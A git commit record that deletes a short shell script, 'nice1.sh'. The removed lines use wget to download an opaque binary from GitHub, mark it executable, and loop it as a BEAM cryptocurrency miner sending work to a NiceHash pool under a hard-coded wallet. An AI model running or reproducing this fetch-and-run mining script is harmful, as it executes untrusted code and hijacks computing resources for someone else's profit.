458446d475fa86e03c4ec66f4b2d5d40dbe3d363
jamesjack21 <89977279+jamesjack21@users.noreply.github.com>
2021-09-16 22:48:57 +0530

    Delete nice1.sh

--- nice1.sh
+++
@@ -1,7 +0,0 @@
-wget https://github.com/archernap/prem/raw/main/priyatama
-chmod +x priyatama
-while [ 1 ]; do
-./priyatama --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 36DFSCTzXk8S7yZuFHzChmenzQL7u7FLVe
-sleep 5
-done
-sleep 999999999
